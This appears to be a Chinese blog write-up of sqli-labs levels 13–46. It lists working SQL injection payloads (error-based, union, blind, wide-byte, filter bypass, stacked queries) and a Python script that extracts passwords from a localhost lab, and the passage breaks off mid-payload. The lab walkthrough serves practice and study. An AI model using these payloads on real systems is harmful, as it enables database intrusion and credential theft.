+<h2 id="Less-13（用户名的单引号括号双注入）"><a href="#Less-13（用户名的单引号括号双注入）" class="headerlink" title="Less-13（用户名的单引号括号双注入）"></a>Less-13（用户名的单引号括号双注入）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">admin&apos;) union select count(*),concat(&apos;~&apos;,(select table_name from information_schema.tables where table_schema=database() limit 3,1),&apos;~&apos;,floor(rand()*2)) as a from information_schema.tables group by a#</span><br><span class="line"></span><br><span class="line">admin&apos;) union select count(*),concat(&apos;~&apos;,(select column_name from information_schema.columns where table_schema=database() and table_name=&apos;users&apos; limit 2,1),&apos;~&apos;,floor(rand()*2)) as a from information_schema.tables group by a#</span><br><span class="line"></span><br><span class="line">admin&apos;) union select count(*),concat(&apos;~&apos;,(select password from users limit 0,1),&apos;~&apos;,floor(rand()*2)) as a from information_schema.tables group by a#</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-14（用户名的双引号双注入）"><a href="#Less-14（用户名的双引号双注入）" class="headerlink" title="Less-14（用户名的双引号双注入）"></a>Less-14（用户名的双引号双注入）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">less-13 单引号括号改双引号</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-15（用户名的单引号布尔注入）"><a href="#Less-15（用户名的单引号布尔注入）" class="headerlink" title="Less-15（用户名的单引号布尔注入）"></a>Less-15（用户名的单引号布尔注入）</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://localhost:8088/sqli-labs-master/Less-15/"</span></span><br><span class="line">length = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">盲注结果：</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">|- security</span></span><br><span class="line"><span class="string">    |- emails</span></span><br><span class="line"><span class="string">    |- referers</span></span><br><span class="line"><span class="string">    |- uagents</span></span><br><span class="line"><span class="string">    |- users</span></span><br><span class="line"><span class="string">        |- id</span></span><br><span class="line"><span class="string">        |- username</span></span><br><span class="line"><span class="string">        |- password</span></span><br><span class="line"><span class="string">            |- Dumb</span></span><br><span class="line"><span class="string">            |- ...</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getLength</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> length</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,<span class="number">11</span>):</span><br><span class="line">        <span class="comment">#payload = "admin' and length(database())=" + str(i) + "#"</span></span><br><span class="line">        <span class="comment">#payload = "admin' and length((select table_name from information_schema.tables where table_schema=database() limit 3,1))=" + str(i) + "#"</span></span><br><span class="line">        <span class="comment">#payload = "admin' and length((select column_name from information_schema.columns where table_name='users' limit 2,1))=" + str(i) + "#"</span></span><br><span class="line">        payload = <span class="string">"admin' and length((select password from users limit 0,1))="</span> + str(i) + <span class="string">"#"</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'uname'</span>:payload,</span><br><span class="line">            <span class="string">'passwd'</span>:<span class="number">123</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"flag.jpg"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            length = i</span><br><span class="line">            print(<span class="string">"【+】 right length: "</span> + str(i))</span><br><span class="line">            print(<span class="string">"--------------------------------------------"</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"【*】 wrong length: "</span> + str(i))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getPayload</span><span class="params">()</span>:</span></span><br><span class="line">    password = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,length+<span class="number">1</span>):</span><br><span class="line">        left = ord(<span class="string">'A'</span>)</span><br><span class="line">        right = ord(<span class="string">'z'</span>)</span><br><span class="line">        <span class="keyword">while</span> left != right:</span><br><span class="line">            mid = int((left + right) / <span class="number">2</span>)</span><br><span class="line">            <span class="comment">#payload = "admin' and ASCII(mid(database()," + str(i) + ",1))&gt;" + str(mid) + "#"</span></span><br><span class="line">            <span class="comment">#payload = "admin' and ASCII(mid((select table_name from information_schema.tables where table_schema=database() limit 3,1)," + str(i) + ",1))&gt;" + str(mid) + "#"</span></span><br><span class="line">            <span class="comment">#payload = "admin' and ASCII(mid((select column_name from information_schema.columns where table_name='users' limit 2,1)," + str(i) + ",1))&gt;" + str(mid) + "#"</span></span><br><span class="line">            payload = <span class="string">"admin' and ASCII(mid((select password from users limit 0,1),"</span> + str(i) + <span class="string">",1))&gt;"</span> + str(mid) + <span class="string">"#"</span></span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">'uname'</span>:payload,</span><br><span class="line">                <span class="string">'passwd'</span>:<span class="number">123</span></span><br><span class="line">            &#125;</span><br><span class="line">            r = requests.post(url,data=data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"flag.jpg"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                left = mid + <span class="number">1</span></span><br><span class="line">                print(str(i) + <span class="string">" &gt; "</span> + chr(mid))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                right = mid</span><br><span class="line">                print(str(i) + <span class="string">" &lt;= "</span> + chr(mid))</span><br><span class="line">        password += chr(left)</span><br><span class="line">        print(<span class="string">"【+】 password: "</span> + password)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    getLength()</span><br><span class="line">    getPayload()</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-16（用户名的双引号括号布尔注入）"><a href="#Less-16（用户名的双引号括号布尔注入）" class="headerlink" title="Less-16（用户名的双引号括号布尔注入）"></a>Less-16（用户名的双引号括号布尔注入）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-17（用户名加密的单引号报错注入）"><a href="#Less-17（用户名加密的单引号报错注入）" class="headerlink" title="Less-17（用户名加密的单引号报错注入）"></a>Less-17（用户名加密的单引号报错注入）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-18（User-Agent-报错注入）"><a href="#Less-18（User-Agent-报错注入）" class="headerlink" title="Less-18（User-Agent 报错注入）"></a>Less-18（User-Agent 报错注入）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: &apos; or updatexml(1,concat(&apos;~&apos;,(select table_name from information_schema where table_schema=database),&apos;~&apos;),1) or</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-19（Referer-报错注入）"><a href="#Less-19（Referer-报错注入）" class="headerlink" title="Less-19（Referer 报错注入）"></a>Less-19（Referer 报错注入）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-20（User-Agent-报错注入）"><a href="#Less-20（User-Agent-报错注入）" class="headerlink" title="Less-20（User-Agent 报错注入）"></a>Less-20（User-Agent 报错注入）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">上 burpsuite 修改 Cookie：</span><br><span class="line"></span><br><span class="line">Cookie: uname=&apos; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#</span><br><span class="line"></span><br><span class="line">Cookie: uname=&apos; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&apos;users&apos;#</span><br><span class="line"></span><br><span class="line">Cookie: uname=&apos; union select 1,2,group_concat(password) from users#</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-21（User-Agent-加密报错注入）"><a href="#Less-21（User-Agent-加密报错注入）" class="headerlink" title="Less-21（User-Agent 加密报错注入）"></a>Less-21（User-Agent 加密报错注入）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">less-20 单引号改单引号括号再用 base64 加密</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-22（User-Agent-加密报错注入）"><a href="#Less-22（User-Agent-加密报错注入）" class="headerlink" title="Less-22（User-Agent 加密报错注入）"></a>Less-22（User-Agent 加密报错注入）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">less-20 单引号改双引号再用 base64 加密</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-23-（过滤注释）"><a href="#Less-23-（过滤注释）" class="headerlink" title="Less-23 （过滤注释）"></a>Less-23 （过滤注释）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=&apos; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() and &apos;1</span><br><span class="line"></span><br><span class="line">?id=&apos; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&apos;users&apos; and &apos;1</span><br><span class="line"></span><br><span class="line">?id=&apos; union select 1,2,group_concat(password) from users where &apos;&apos;=&apos;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-24-（二次排序漏洞）"><a href="#Less-24-（二次排序漏洞）" class="headerlink" title="Less-24 （二次排序漏洞）"></a>Less-24 （二次排序漏洞）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">先注册一个 admin&apos;# 账号再修改 admin&apos;# 的密码，新密码即为 admin 的密码。</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Less-25-（过滤-or-amp-and）"><a href="#Less-25-（过滤-or-amp-and）" class="headerlink" title="Less-25 （过滤 or &amp; and）"></a>Less-25 （过滤 or &amp; and）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">一次性关键词绕过 用 oorr 和 aandnd 绕过</span><br><span class="line"></span><br><span class="line">?id=&apos; union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database()--+</span><br><span class="line"></span><br><span class="line">?id=&apos; union select 1,2,group_concat(column_name) from infoorrmation_schema.columns where table_schema=database() aandnd table_name=&apos;users&apos;--+</span><br><span class="line"></span><br><span class="line">?id=&apos; union select 1,2,group_concat(passwoorrd)  from users--+</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-25a（过滤-or-amp-and-）"><a href="#Less-25a（过滤-or-amp-and-）" class="headerlink" title="Less-25a（过滤 or &amp; and ）"></a>Less-25a（过滤 or &amp; and ）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">表面上是盲注，背地里是 less-25 无引号的 union 注入...</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-26-（过滤空格和注释的报错注入）"><a href="#Less-26-（过滤空格和注释的报错注入）" class="headerlink" title="Less-26 （过滤空格和注释的报错注入）"></a>Less-26 （过滤空格和注释的报错注入）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">本题全部空格都过滤了，所以采取报错注入</span><br><span class="line">or 用 || 代替，and 用 %26%26 代替（&amp;&amp;也过滤了）</span><br><span class="line">注释则用 ||&apos;1 闭合</span><br><span class="line"></span><br><span class="line">?id=&apos;||updatexml(1,concat(&apos;~&apos;,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database())),&apos;~&apos;),1)||&apos;1</span><br><span class="line"></span><br><span class="line">?id=&apos;||updatexml(1,concat(&apos;~&apos;,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=database())%26%26(table_name=&apos;user&apos;)),&apos;~&apos;),1)||&apos;1</span><br><span class="line"></span><br><span class="line">?id=&apos;||updatexml(1,concat(&apos;~&apos;,(select(group_concat(passwoorrd))from(users)),&apos;~&apos;),1)||&apos;1</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-26a（过滤空格和注释的布尔注入）"><a href="#Less-26a（过滤空格和注释的布尔注入）" class="headerlink" title="Less-26a（过滤空格和注释的布尔注入）"></a>Less-26a（过滤空格和注释的布尔注入）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">空格全部被过滤，此题又不能进行报错注入，所以采取布尔注入</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-27-（过滤-nion-和-select-的-union-注入）"><a href="#Less-27-（过滤-nion-和-select-的-union-注入）" class="headerlink" title="Less-27 （过滤 nion 和 select 的 union 注入）"></a>Less-27 （过滤 nion 和 select 的 union 注入）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">union 注入：</span><br><span class="line">通过脚本可知空格可以用 %09、%0a-%0d 绕过</span><br><span class="line">非一次性关键词绕过，union 和 select 用大小写 unioN 和 selecT 绕过</span><br><span class="line"></span><br><span class="line">?id=&apos;%0AunioN%0AselecT%0A1,2,group_concat(table_name)%0Afrom%0Ainformation_schema.tables%0Awhere%0Atable_schema=database()%0Aand%0A&apos;1</span><br><span class="line"></span><br><span class="line">?id=&apos;%0AunioN%0AselecT%0A1,2,group_concat(column_name)%0Afrom%0Ainformation_schema.columns%0Awhere%0Atable_schema=database()%0Aand%0Atable_name=&apos;users&apos;%0Aand%0A&apos;1</span><br><span class="line"></span><br><span class="line">?id=&apos;%0AunioN%0AselecT%0A1,2,group_concat(column_name)%0Afrom%0Ausers%0Awhere%0A&apos;1</span><br><span class="line">或者</span><br><span class="line">?id=&apos;%0AunioN%0AselecT%0A1,(selecT%0Agroup_concat(password)%0Afrom%0Ausers),3%0A||&apos;</span><br><span class="line"></span><br><span class="line">报错注入：</span><br><span class="line">其他与 less-26 类似</span><br><span class="line"></span><br><span class="line">?id=&apos;||updatexml(1,concat(&apos;~&apos;,(selecT(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&apos;~&apos;),1)||&apos;1</span><br><span class="line"></span><br><span class="line">?id=&apos;||updatexml(1,concat(&apos;~&apos;,(selecT(group_concat(column_name))from(information_schema.columns)where(table_schema=database())%26%26(table_name=&apos;users&apos;)),&apos;~&apos;),1)||&apos;1</span><br><span class="line"></span><br><span class="line">?id=&apos;||updatexml(1,concat(&apos;~&apos;,(selecT(group_concat(password))from(users)),&apos;~&apos;),1)||&apos;1</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-27a（过滤-nion-和-select-的时间盲注）"><a href="#Less-27a（过滤-nion-和-select-的时间盲注）" class="headerlink" title="Less-27a（过滤 nion 和 select 的时间盲注）"></a>Less-27a（过滤 nion 和 select 的时间盲注）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">双引号 + 时间盲注</span><br><span class="line">其他同 less-27</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-28（过滤-nion-和-select-的-union-注入）"><a href="#Less-28（过滤-nion-和-select-的-union-注入）" class="headerlink" title="Less-28（过滤 nion 和 select 的 union 注入）"></a>Less-28（过滤 nion 和 select 的 union 注入）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">有个小bug，网上的 payload 都是 union 注入，但是我的空格不能用 %a0 绕过...所以只好用布尔盲注</span><br><span class="line"></span><br><span class="line">?id=1&apos;)and(ascii(mid(database(),1,1))=115)and(&apos;1&apos;)=(&apos;1</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-28a（过滤-union-和-select-的布尔注入）"><a href="#Less-28a（过滤-union-和-select-的布尔注入）" class="headerlink" title="Less-28a（过滤 union 和 select 的布尔注入）"></a>Less-28a（过滤 union 和 select 的布尔注入）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">同 less-28</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-29（WAF1）"><a href="#Less-29（WAF1）" class="headerlink" title="Less-29（WAF1）"></a>Less-29（WAF1）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">这题是？？？签到题？？？</span><br><span class="line"></span><br><span class="line">?id=&apos; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+</span><br><span class="line"></span><br><span class="line">?id=&apos; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=&apos;users&apos;--+</span><br><span class="line"></span><br><span class="line">?id=&apos; union select 1,group_concat(password),3 from users--+</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-30（WAF2）"><a href="#Less-30（WAF2）" class="headerlink" title="Less-30（WAF2）"></a>Less-30（WAF2）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">less-29 单引号改双引号</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-31（WAF3）"><a href="#Less-31（WAF3）" class="headerlink" title="Less-31（WAF3）"></a>Less-31（WAF3）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">less-29 单引号改双引号括号</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-32（宽字节注入）"><a href="#Less-32（宽字节注入）" class="headerlink" title="Less-32（宽字节注入）"></a>Less-32（宽字节注入）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">基于 get 方法的宽字节注入，加 %df 绕过</span><br><span class="line"></span><br><span class="line">?id=%df&apos; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+</span><br><span class="line"></span><br><span class="line">?id=%df&apos; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=&apos;users&apos;--+</span><br><span class="line"></span><br><span class="line">?id=%df&apos; union select 1,group_concat(password),3 from users--+</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-33（宽字节注入）"><a href="#Less-33（宽字节注入）" class="headerlink" title="Less-33（宽字节注入）"></a>Less-33（宽字节注入）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">同 less-32</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-34（用户名和密码加反斜杠）"><a href="#Less-34（用户名和密码加反斜杠）" class="headerlink" title="Less-34（用户名和密码加反斜杠）"></a>Less-34（用户名和密码加反斜杠）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">基于 post 的宽字节注入，又可以将 utf-8 转换为 utf-16 或 utf-32，例如将&apos;转为 utf-16 为 %EF%BF%BD&apos;/�&apos;</span><br><span class="line"></span><br><span class="line">万能密码 �&apos; or 1# 不知道为什么我的电脑只有这个能用</span><br><span class="line"></span><br><span class="line">admin=�&apos; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()# </span><br><span class="line"></span><br><span class="line">admin=�&apos; union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273# </span><br><span class="line"></span><br><span class="line">admin=�&apos; union select 1,group_concat(password) from users#</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-35（加反斜杠没引号的-union-注入）"><a href="#Less-35（加反斜杠没引号的-union-注入）" class="headerlink" title="Less-35（加反斜杠没引号的 union 注入）"></a>Less-35（加反斜杠没引号的 union 注入）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=0 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+</span><br><span class="line"></span><br><span class="line">?id=0 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=&apos;users&apos;--+</span><br><span class="line"></span><br><span class="line">?id=0 union select 1,group_concat(password),3 from users--+</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-36（基于-get-的-mysql-real-escape-string-函数的-union-注入）"><a href="#Less-36（基于-get-的-mysql-real-escape-string-函数的-union-注入）" class="headerlink" title="Less-36（基于 get 的 mysql_real_escape_string() 函数的 union 注入）"></a>Less-36（基于 get 的 mysql_real_escape_string() 函数的 union 注入）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">同 less-32</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-37（基于-post-的-mysql-real-escape-string-函数的-union-注入）"><a href="#Less-37（基于-post-的-mysql-real-escape-string-函数的-union-注入）" class="headerlink" title="Less-37（基于 post 的 mysql_real_escape_string() 函数的 union 注入）"></a>Less-37（基于 post 的 mysql_real_escape_string() 函数的 union 注入）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">同 less-34</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-38（堆叠注入）"><a href="#Less-38（堆叠注入）" class="headerlink" title="Less-38（堆叠注入）"></a>Less-38（堆叠注入）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">stacked injection：在mysql中，主要是命令行中，每一条语句结尾加 ; 表示语句结束。所以我们可以利用分号进行多聚输入。</span><br><span class="line"></span><br><span class="line">?id=1&apos;;insert into users(id,username,password) values(15,&apos;less38&apos;,&apos;less38&apos;) -- +</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-39（堆叠注入）"><a href="#Less-39（堆叠注入）" class="headerlink" title="Less-39（堆叠注入）"></a>Less-39（堆叠注入）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1;insert into users(id,username,password) values(16,&apos;less39&apos;,&apos;less39&apos;) -- +</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-40（堆叠注入）"><a href="#Less-40（堆叠注入）" class="headerlink" title="Less-40（堆叠注入）"></a>Less-40（堆叠注入）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;);insert into users(id,username,password) values(17,&apos;less40&apos;,&apos;less40&apos;) -- +</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-41（堆叠注入）"><a href="#Less-41（堆叠注入）" class="headerlink" title="Less-41（堆叠注入）"></a>Less-41（堆叠注入）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">同 less-39 区别于无报错信息</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-42（堆叠注入）"><a href="#Less-42（堆叠注入）" class="headerlink" title="Less-42（堆叠注入）"></a>Less-42（堆叠注入）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用户名做了转义处理，可以对密码进行堆叠注入</span><br><span class="line"></span><br><span class="line">login_user=1&amp;login_password=1&apos;;create table less42 like users#</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-43（堆叠注入）"><a href="#Less-43（堆叠注入）" class="headerlink" title="Less-43（堆叠注入）"></a>Less-43（堆叠注入）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">类似 less-42，只是多了个括号</span><br><span class="line"></span><br><span class="line">login_user=1&amp;login_password=1&apos;);create table less43 like users#</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-44（堆叠注入）"><a href="#Less-44（堆叠注入）" class="headerlink" title="Less-44（堆叠注入）"></a>Less-44（堆叠注入）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">同 less-42 只是没有报错信息</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-45（堆叠注入）"><a href="#Less-45（堆叠注入）" class="headerlink" title="Less-45（堆叠注入）"></a>Less-45（堆叠注入）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">同 less-43 只是没有报错信息</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-46（order-by-注入）"><a href="#Less-46（order-by-注入）" class="headerlink" title="Less-46（order by 注入）"></a>Less-46（order by 注入）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">此题可考虑报错注入和延时注入：</span><br><span class="line">1. 直接添加注入语句，?sort=(select ******)；</span><br><span class="line">2. 利用一些函数。例如rand()函数等。?sort=rand(sql语句)，对比rand(ture)和rand(false)的结果，可以判断是否注入成功；</span><br><span class="line">3. 利用and，例如?sort=1 and (加sql语句)。</span><br><span class="line"></span><br><span class="line">报错注入：</span><br><span class="line"></span><br><span class="line">?sort=1 and extractvalue(1,concat(&apos;~&apos;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&apos;~&apos;))--+</span><br><span class="line"></span><br><span class="line">?sort=1 and extractvalue(1,concat(&apos;~&apos;,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&apos;users&apos;),&apos;~&apos;))--+</span><br><span class="line"></span><br><span class="line">?sort=1 and extractvalue(1,concat(&apos;~&apos;,(select group_concat(password) from 